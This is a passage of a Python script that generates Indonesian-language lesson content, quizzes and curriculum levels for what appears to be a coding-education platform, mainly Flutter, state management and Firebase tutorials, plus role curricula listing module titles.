             "final _formKey = GlobalKey<FormState>();\nfinal _emailController = TextEditingController();\n\nWidget build(BuildContext context) {\n  return Form(\n    key: _formKey,\n    child: TextFormField(\n      controller: _emailController,\n      validator: (val) => val!.contains('@') ? null : 'Email tidak valid!',\n      decoration: InputDecoration(labelText: 'Email Anda'),\n    ),\n  );\n}",
             "- `Form` & `GlobalKey`: Pengelola status validasi seluruh kolom input di dalam satu kelompok formulir.\n- `TextEditingController`: Pengontrol untuk membaca atau mengubah teks di dalam `TextFormField`.",
             "Jangan lupa memanggil `_emailController.dispose()` saat widget dihancurkan untuk membebaskan memori."),
        ],

        "State Management": [
            ("Tantangan State Management di Aplikasi Mobile",
             "Masalah yang timbul saat membagikan data (state) antar halaman aplikasi yang jauh tanpa Prop Drilling.",
             "Sebab utama diadakannya arsitektur manajemen state modern pada pengembangan aplikasi Flutter.",
             "text",
             "MASALAH PROP DRILLING:\n[Halaman Utama] -> (kirim data) -> [Parent Widget] -> (kirim data) -> [Child Widget] -> [Target Button]\n\nSOLUSI STATE MANAGEMENT:\n[State Provider Terpusat] ===== (langsung diakses) =====> [Target Button]",
             "- Prop Drilling: Mempassing data melewati banyak lapisan widget intermediate yang sebenarnya tidak butuh data tersebut.\n- Separation of UI and Business Logic: Memisahkan tampilan murni visual dari logika pemrosesan data.",
             "Pilih satu pola State Management terstandar dan gunakan secara konsisten di seluruh proyek aplikasi."),

            ("State Management dengan Provider Pattern",
             "Provider adalah solusi manajemen state resmi yang direkomendasikan oleh tim pengembang Flutter.",
             "Menggunakan pendekatan `ChangeNotifier` untuk membroadcast perubahan data secara reaktif ke UI.",
             "dart",
             "import 'package:flutter/material.dart';\nimport 'package:provider/provider.dart';\n\nclass CartModel extends ChangeNotifier {\n  int itemCount = 0;\n  void addItem() {\n    itemCount++;\n    notifyListeners(); // Beritahu seluruh UI untuk me-render ulang!\n  }\n}",
             "- `ChangeNotifier`: Class pembawa state yang memancarkan sinyal pemberitahuan saat ada data berubah.\n- `notifyListeners()`: Fungsi pemicu agar widget `Consumer` me-render ulang tampilannya.",
             "Gunakan `context.read<T>()` untuk memanggil fungsi dan `context.watch<T>()` untuk mendengarkan perubahan nilai UI."),

            ("Arsitektur Modern dengan Riverpod / Bloc",
             "Mengenal dua kerangka manajemen state tingkat lanjut untuk aplikasi skala enterprise: Riverpod dan BLoC.",
             "Memberikan keandalan tinggi, kemudahan pengujian unit test, dan bebas dari ketergantungan `BuildContext`.",
             "dart",
             "// Contoh StateNotifier di Riverpod\nimport 'package:flutter_riverpod/flutter_riverpod.dart';\n\nclass CounterNotifier extends StateNotifier<int> {\n  CounterNotifier() : super(0);\n  void increment() => state++;\n}\n\nfinal counterProvider = StateNotifierProvider<CounterNotifier, int>((ref) => CounterNotifier());",
             "- Riverpod: Versi penyempurnaan total dari Provider yang bebas dari Compile-Time Error dan BuildContext.\n- BLoC (Business Logic Component): Menggunakan alur Event-to-State berbasis Stream yang sangat terstruktur.",
             "Manfaatkan BLoC atau Riverpod jika aplikasi memuat banyak transaksi data kompleks dan tim pengembang besar."),

            ("Memisahkan Logic Bisnis dari UI (Clean Architecture)",
             "Menerapkan prinsip Clean Architecture dengan membagi proyek menjadi 3 lapisan: Presentation, Domain, dan Data.",
             "Membuat basis kode aplikasi sangat rapi, mudah diuji (unit testable), dan independen dari perubahan eksternal.",
             "text",
             "3 LAPISAN CLEAN ARCHITECTURE:\n1. Presentation Layer : UI Widgets, Controllers/Bloc/Providers\n2. Domain Layer       : Entities (Model Bisnis), Use Cases (Aturan Bisnis Utama)\n3. Data Layer         : Data Sources (API Client, Local DB), Repositories Implementation",
             "- Use Case: Satu aksi spesifik logika bisnis (misal `GetUserProfileUseCase`).\n- Repository Pattern: Menjadi jembatan yang menyembunyikan asal pengambilan data (apakah dari Internet atau Cache Lokal).",
             "Lapisan Domain tidak boleh bergantung pada paket eksternal Flutter atau UI apapun."),
        ],

        "Firebase Mobile": [
            ("Inisialisasi Firebase Core di Project Flutter",
             "Langkah-langkah mengonfigurasi proyek Flutter agar terhubung dengan layanan Firebase menggunakan CLI resmi.",
             "Pondasi dasar sebelum mengadopsi layanan autentikasi, database, dan analitik di Flutter.",
             "dart",
             "import 'package:flutter/material.dart';\nimport 'package:firebase_core/firebase_core.dart';\nimport 'firebase_options.dart';\n\nvoid main() async {\n  WidgetsFlutterBinding.ensureInitialized();\n  await Firebase.initializeApp(\n    options: DefaultFirebaseOptions.currentPlatform,\n  );\n  runApp(MyApp());\n}",
             "- `FlutterFire CLI`: Tools otomatisasi CLI untuk mengonfigurasi Firebase di Android dan iOS dalam satu perintah.\n- `firebase_options.dart`: File konfigurasi otomatis berisikan API Key Firebase untuk tiap platform.",
             "Selalu panggil `WidgetsFlutterBinding.ensureInitialized()` sebelum memanggil `Firebase.initializeApp()`."),

            ("Implementasi Login & Register dengan Firebase Auth",
             "Membuat fitur pendaftaran dan masuk akun menggunakan pustaka `firebase_auth` di Flutter.",
             "Memberikan sistem manajemen identitas pengguna terenkripsi secara gratis dan instan.",
             "dart",
             "import 'package:firebase_auth/firebase_auth.dart';\n\nfinal FirebaseAuth _auth = FirebaseAuth.instance;\n\nFuture<UserCredential?> signUp(String email, String password) async {\n  try {\n    return await _auth.createUserWithEmailAndPassword(\n      email: email,\n      password: password,\n    );\n  } on FirebaseAuthException catch (e) {\n    print('Auth Error: ${e.message}');\n    return null;\n  }\n}",
             "- `FirebaseAuthException`: Menangkap pesan error spesifik dari Firebase (misal email sudah terdaftar).\n- `authStateChanges()`: Stream bawaan yang memancar status login pengguna secara real-time.",
             "Gunakan `StreamBuilder` terhubung ke `authStateChanges()` untuk mengarahkan pengguna ke Halaman Utama secara otomatis."),

            ("CRUD Operation dengan Cloud Firestore Database",
             "Menambah, membaca, mengedit, dan menghapus dokumen di Cloud Firestore dari aplikasi Flutter.",
             "Menghubungkan antarmuka antarmuka Flutter ke penyimpanan data NoSQL berbasis cloud.",
             "dart",
             "import 'package:cloud_firestore/cloud_firestore.dart';\n\nfinal FirebaseFirestore _db = FirebaseFirestore.instance;\n\n// Menambah data ke koleksi 'users'\nFuture<void> addUser(String name, String role) async {\n  await _db.collection('users').add({\n    'name': name,\n    'role': role,\n    'createdAt': FieldValue.serverTimestamp(),\n  });\n}",
             "- `FieldValue.serverTimestamp()`: Menggunakan stempel waktu resmi dari server Firebase untuk konsistensi data.\n- `.snapshots()`: Mengembalikan Stream data real-time dari koleksi Firestore.",
             "Manfaatkan `StreamBuilder` dengan `.snapshots()` untuk membuat daftar list data yang ter-update otomatis."),

            ("Build & Export APK / IPA untuk Distribution",
             "Mengompilasi basis kode Flutter menjadi biner rilis teroptimasi siap edar (APK/AAB untuk Android, IPA untuk iOS).",
             "Langkah akhir untuk mendistribusikan aplikasi ke pengguna publik via Google Play Store dan Apple App Store.",
             "bash",
             "# 1. Build Android App Bundle (AAB) untuk Google Play Store\nflutter build appbundle --release\n\n# 2. Build iOS IPA untuk App Store / TestFlight\nflutter build ipa --release",
             "- App Bundle (.aab): Format kompresi rilis resmi Play Store yang memperkecil ukuran unduhan di HP pengguna.\n- Obfuscation (`--obfuscate`): Menyamarkan nama fungsi di biner rilis agar sulit di-reverse engineering.",
             "Selalu uji rilis build lokal terlebih dahulu dengan perintah `flutter run --release` sebelum diunggah ke Store."),
        ],
    }

    if module_title in SPECIFIC_CONTENT:
        lesson_data = SPECIFIC_CONTENT[module_title]
        lessons = []
        for i, (title, analogi, pentingnya, lang, code, penjelasan, summary) in enumerate(lesson_data):
            visual_desc = penjelasan.split('.')[0] if '.' in penjelasan else penjelasan
            content = f"""# {title}

🏗️ **Analogi & Gambaran Besar**

{analogi}

> 💡 **Gambaran Singkat**:
> Konsep ini sengaja dirancang agar kamu tidak perlu pusing menghafal istilah teknis yang rumit terlebih dahulu. Bayangkan bentuk dan fungsinya di dunia nyata, baru kita bedah kodenya bersama-sama!

---

📖 **Penjelasan Sederhana**

**Kenapa sih teknologi atau konsep ini harus ada dan kita pakai?**
{pentingnya}

Tanpa pemahaman yang tepat mengenai konsep ini, alur kerja pengembang akan terasa membingungkan, serabutan, dan rawan masalah saat aplikasi bertambah besar. Dengan menguasai materi ini, kodenmu akan jauh lebih terstruktur, efisien, dan siap dipakai di lingkungan profesional!

---

💻 **Contoh Kode & Visualisasi Hasil**

Berikut adalah contoh potongan kode sederhana dan bersih yang menerapkan konsep ini:

```{lang}
{code}
```

> 🖥️ **Visualisasi & Hasil di Komputer**:
> Ketika kode di atas dijalankan, sistem/browser akan mengeksekusinya secara berurutan: {visual_desc}. Kamu bisa langsung melihat dampaknya pada aplikasi!

---

🛠️ **Elemen / Fitur Utama yang Sering Dipakai**

Untuk menguasai materi ini dengan cepat, perhatikan komponen-komponen kunci yang paling sering digunakan sehari-hari:

{penjelasan}

---

🔍 **Mitos vs Fakta / Perbandingan Penting**

| Aspek | Mitos (Miskonsepsi Pemula) | Fakta Sebenarnya |
|---|---|---|
| **Cara Belajar** | Harus menghafal luar kepala semua kode & atribut. | Cukup pahami logika dasarnya & manfaatkan dokumentasi resmi. |
| **Penggunaan** | Hanya dipakai di proyek skala besar / industri enterprise. | Digunakan sebagai pilar dasar di *setiap* proyek aplikasi nyata. |
| **Tujuan** | Untuk membuat kode terlihat rumit & canggih. | Untuk membuat sistem lebih rapi, cepat, aman, dan mudah dirawat. |

---

⚡ **Bagaimana Teknologi Ini Bekerja Bersama Stack Lain**

Di dalam ekosistem **{role_name}**, materi **{title}** tidak berdiri sendiri. Ia adalah jembatan utama yang menghubungkan instruksi dasar dengan modul-modul lanjutan.

Ketika kamu menggabungkan **{title}** dengan tools dan stack pendukung lainnya di role **{role_name}**, aplikasimu akan mendadak jadi jauh lebih interaktif, tangguh, dan siap pakai untuk skala produksi!

---

📌 **Kesimpulan & Rangkuman Ringkas**

- 🎯 **Poin Utama**: {summary}
- 💡 **Tips Belajar**: Selalu utamakan konsistensi dan pemahaman konsep dasar sebelum melangkah ke fitur yang lebih kompleks.
- 🚀 **Langkah Selanjutnya**: Coba ketik ulang potongan kode di atas di editor kodenmu sendiri dan rasakan sensasi berhasilnya!

> 💬 *"Koding itu seperti belajar bahasa baru: makin sering kamu berlatih dan mencoba, makin alami kamu mengekspresikan ide-idemu lewat baris kode."*

---

## Quiz

### Soal 1

Apa tujuan utama dari mempelajari dan menerapkan konsep **{title}** pada modul ini?

- A. Mengurangi fungsionalitas sistem agar lebih sederhana.
- B. Memastikan kode tidak dapat dipahami oleh pihak lain.
- C. Meningkatkan kualitas, keamanan, atau performa aplikasi secara terstruktur.
- D. Hanya sekedar tambahan dekoratif tanpa efek teknis nyata.

Jawaban benar: C

Penjelasan: Setiap konsep fundamental yang dipelajari pada role ini ditujukan untuk membangun struktur dan standar aplikasi yang berkualitas tinggi, aman, dan efisien.
"""
            lessons.append({
                "slug": f"{role_slug}-lesson-{level_num}-{i+1}",
                "title": title,
                "summary": analogi[:120] + ("..." if len(analogi) > 120 else ""),
                "content": content,
                "duration": f"{15 + (i * 5)} menit",
                "order_index": i + 1,
                "xp_reward": 50 if i < 3 else 100,
                "is_project": i == 3,
            })
        return lessons

    # Universal Fallback
    lesson_titles = [
        f"Konsep Mendasar: {module_title}",
        f"Komponen Utama: {module_title}",
        f"Praktik & Eksperimen: {module_title}",
        f"Mini Project & Misi Akhir: {module_title}"
    ]
    lessons = []
    for i in range(4):
        content = f"""# {lesson_titles[i]}

🏗️ **Analogi & Gambaran Besar**

Mempelajari **{module_title}** itu ibarat belajar mengendarai kendaraan baru! Awalnya mungkin terasa canggung, namun setelah kamu memahami prinsip dasarnya, seluruh navigasi dan kontrol akan terasa sangat alami dan menyenangkan.

> 💡 **Gambaran Singkat**:
> Mulailah dari membayangkan fungsi utamanya di dunia nyata. Jangan pusing dengan hafalan rumit terlebih dahulu!

---

📖 **Penjelasan Sederhana**

Sebagai seorang **{role_name}**, modul **{module_title}** adalah salah satu pilar utama. Memahaminya dengan baik akan membantumu menyelesaikan tugas harian dengan percaya diri tanpa perlu menyalin kode tanpa arah.

Tanpa konsep ini, kodenmu akan rawan bug dan sulit dikembangkan saat proyek membesar.

---

💻 **Contoh Kode & Visualisasi Hasil**

Lihatlah contoh eksekusi dasar untuk modul ini:

```text
// Inisialisasi & Eksekusi Modul {module_title}
Execute-Module --title "{module_title}" --step {i+1} --mode "Beginner-Friendly"
```

> 🖥️ **Visualisasi Hasil di Komputer**:
> Instruksi di atas akan menyiapkan fondasi lingkungan kerja, memproses input dasar, dan menampilkan hasil secara instan di layar console.

---

🛠️ **Elemen / Fitur Utama yang Sering Dipakai**

- **Inisialisasi**: Menyiapkan variabel, modul & dependensi awal.
- **Eksekusi Utama**: Menjalankan logika bisnis, perintah sistem, atau manipulasi data.
- **Validasi & Output**: Memastikan tidak ada error dan hasil ditampilkan dengan rapi kepada pengguna.

---

🔍 **Mitos vs Fakta / Perbandingan Penting**

| Perbandingan | Konsep Dasar | Praktik Industri |
|---|---|---|
| **Fokus Utama** | Memahami *kenapa* kode ditulis. | Mengoptimalkan *efisiensi*, *performa*, dan *keamanan*. |
| **Pendekatan** | Belajar dari contoh sederhana & analogi. | Membangun komponen yang reusable dan mudah diuji. |

---

⚡ **Bagaimana Teknologi Ini Bekerja Bersama Stack Lain**

Modul ini terhubung langsung dengan alur pembelajaran **{role_name}**. Dengan menguasai bab ini, kamu siap untuk melangkah ke modul berikutnya yang jauh lebih seru!

---

📌 **Kesimpulan & Rangkuman Ringkas**

- 🎯 **Poin Utama**: Kuasai konsep dasar ini dan selalu jadikan dokumentasi resmi sebagai rujukan utama.
- 🚀 **Aksi**: Jangan ragu untuk mencoba, bereksperimen, dan membuat salah di editor kodenmu!

---

## Quiz

### Soal 1

Apa tujuan utama dari mempelajari modul fundamental seperti **{module_title}**?

- A. Menghafal kode tanpa memahaminya.
- B. Memahami prinsip dasar agar dapat menyelesaikan masalah teknis yang kompleks secara mandiri.
- C. Menyalin dan menempel solusi orang lain.
- D. Mempersulit pengembangan di masa depan.

Jawaban benar: B

Penjelasan: Memahami prinsip dasar yang fundamental adalah kunci untuk menjadi profesional yang dapat memecahkan masalah teknis kompleks secara mandiri.
"""
        lessons.append({
            "slug": f"{role_slug}-lesson-{level_num}-{i+1}",
            "title": lesson_titles[i],
            "summary": f"Membahas konsep dan penerapan utama dari {module_title}.",
            "content": content,
            "duration": f"{15 + (i * 5)} menit",
            "order_index": i + 1,
            "xp_reward": 50 if i < 3 else 100,
            "is_project": i == 3,
        })
    return lessons


def generate_dummy_levels(role_name: str, role_slug: str) -> list[dict[str, Any]]:
    """Generate 4 complete levels/modules for a given role slug."""
    curricula = {
        # WEB DEVELOPMENT
        "frontend-developer": [
            ("HTML & CSS Dasar", "Modul 1: Memahami kerangka dan desain halaman web."),
            ("Modern JavaScript", "Modul 2: Logika pemrograman dan interaktivitas."),
            ("Responsive Design & Git", "Modul 3: Desain adaptif dan kolaborasi kode."),
            ("React.js / Next.js", "Modul 4: Membangun UI modern dengan framework.")
        ],
        "backend-developer": [
            ("HTTP & REST API", "Modul 1: Komunikasi antara client dan server."),
            ("Node.js & Express", "Modul 2: Membangun server web dasar."),
            ("SQL & PostgreSQL", "Modul 3: Menyimpan dan mengelola data."),
            ("Authentication & Security", "Modul 4: Mengamankan aplikasi dan pengguna.")
        ],
        "fullstack-developer": [
            ("HTML, CSS & JS", "Modul 1: Dasar-dasar frontend."),
            ("React.js / Next.js", "Modul 2: Membangun antarmuka modern."),
            ("Node.js & PostgreSQL", "Modul 3: Logika backend dan database."),
            ("REST API & Integration", "Modul 4: Menyatukan frontend dan backend.")
        ],

        # CYBERSECURITY
        "penetration-tester": [
            ("Linux Basics", "Modul 1: Penguasaan sistem operasi hacker."),
            ("Networking Fundamentals", "Modul 2: Cara kerja jaringan dan protokol."),
            ("OWASP Top 10", "Modul 3: Kerentanan paling umum di aplikasi web."),
            ("Burp Suite & Web Hacking", "Modul 4: Praktik peretasan aplikasi web.")
        ],
        "soc-analyst": [
            ("Networking Basics", "Modul 1: Dasar-dasar jaringan komputer."),
            ("SIEM Fundamentals", "Modul 2: Manajemen log dan insiden keamanan."),
            ("Windows & Linux Admin", "Modul 3: Administrasi sistem operasi."),
            ("Log Analysis", "Modul 4: Menganalisa log untuk deteksi ancaman.")
        ],
        "security-engineer": [
            ("Firewall & Network Security", "Modul 1: Mengamankan perimeter jaringan."),
            ("IDS / IPS", "Modul 2: Deteksi dan pencegahan intrusi."),
            ("VPN & Secure Access", "Modul 3: Akses jarak jauh yang aman."),
            ("IAM & Cloud Security", "Modul 4: Identitas dan keamanan komputasi awan.")
        ],
        "malware-analyst": [
            ("Bahasa C & Fundamental", "Modul 1: Bahasa pemrograman tingkat rendah."),
            ("Assembly Basics", "Modul 2: Membaca instruksi mesin."),
            ("Reverse Engineering", "Modul 3: Rekayasa balik perangkat lunak."),
            ("Ghidra & IDA Tools", "Modul 4: Menggunakan alat analisis malware.")
        ],

        # MOBILE DEVELOPMENT
        "android-developer": [
            ("Kotlin Basics", "Modul 1: Sintaks dan fitur bahasa Kotlin."),
            ("Android Studio Setup", "Modul 2: Pengenalan IDE dan emulator."),
            ("Jetpack Compose UI", "Modul 3: Membangun UI Android modern."),
            ("Firebase Integration", "Modul 4: Layanan backend untuk aplikasi mobile.")
        ],
        "ios-developer": [
            ("Swift Fundamentals", "Modul 1: Bahasa pemrograman untuk ekosistem Apple."),
            ("SwiftUI Essentials", "Modul 2: Membangun UI reaktif."),
            ("Xcode Workflow", "Modul 3: Alur kerja pengembangan iOS."),
            ("iOS App State", "Modul 4: Manajemen state pada aplikasi iOS.")
        ],
        "flutter-developer": [
            ("Dart Programming", "Modul 1: Bahasa di balik Flutter."),
            ("Flutter UI Basics", "Modul 2: Widget dan layout dasar."),
            ("State Management", "Modul 3: Mengelola state aplikasi (Provider/Riverpod)."),
            ("Firebase Mobile", "Modul 4: Integrasi backend Firebase.")
        ]
    }

    modules = curricula.get(role_slug)
    if not modules:
        modules = [
            (f"Pengenalan {role_name}", "Modul 1: Konsep dasar dan pondasi."),
            (f"Tools & Lingkungan {role_name}", "Modul 2: Persiapan alat kerja."),
            (f"Konsep Inti {role_name}", "Modul 3: Teori dan praktik utama."),
            (f"Proyek Akhir {role_name}", "Modul 4: Menerapkan semua yang telah dipelajari.")
        ]

    levels = []
    for idx, (title, subtitle) in enumerate(modules):
        level_num = idx + 1
        levels.append({
            "number": level_num,
            "slug": f"{role_slug}-level-{level_num}",
            "title": f"Level {level_num:02d}: {title}",
            "subtitle": subtitle,
            "description": f"Pelajari {title.lower()} sebagai langkah penting menjadi seorang {role_name}.",
            "duration": "2 Minggu",
            "difficulty": "Beginner" if level_num <= 2 else "Intermediate",
            "accent_color": "from-blue-500/20 to-purple-500/20",
            "mini_project": f"Proyek Mini {level_num}: {title}",
            "tags": [role_name, "Dasar", f"Modul {level_num}"],
            "lessons": generate_rich_lessons(role_name, role_slug, level_num, title),
        })

    return levels
